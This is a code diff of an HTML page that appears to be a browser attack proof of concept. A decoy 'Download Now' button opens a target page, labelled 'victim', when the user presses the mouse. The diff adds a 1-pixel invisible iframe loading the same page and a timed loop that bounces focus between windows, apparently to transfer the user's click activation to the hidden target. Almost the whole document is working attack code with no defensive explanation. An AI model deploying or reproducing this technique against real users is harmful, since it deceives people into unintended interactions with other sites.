@@ -11,23 +11,49 @@
         Download Now
     </button>
 
+    <iframe id="ghostFrame" style="width:1px;height:1px;opacity:0;"></iframe>
+
     <script>
         const targetURL = "https://read-poc.vercel.app/";
         let victim = null;
 
-        document.getElementById("btn").addEventListener("mousedown", () => {
-            // buka target pas user mulai klik
+        const btn = document.getElementById("btn");
+        const ghost = document.getElementById("ghostFrame");
+
+        btn.addEventListener("mousedown", () => {
+            console.log("[*] mousedown → open victim");
             victim = window.open(targetURL, "_blank");
+
+            ghost.src = targetURL;
+
+            startFocusBounce();
         });
 
-        document.getElementById("btn").addEventListener("mouseup", () => {
-            // saat user lepas klik → arahkan activation
+        btn.addEventListener("mouseup", () => {
+            console.log("[*] mouseup → shift activation");
+
             if (victim) {
                 try {
                     victim.focus();
-                } catch (e) { }
+                } catch (e) {}
             }
         });
+
+        function startFocusBounce() {
+            const interval = setInterval(() => {
+                if (!victim || victim.closed) {
+                    clearInterval(interval);
+                    return;
+                }
+
+                try {
+                    victim.focus();
+                    window.focus();
+                } catch (e) {}
+            }, 50);
+
+            setTimeout(() => clearInterval(interval), 1000);
+        }
     </script>
 
 </body>
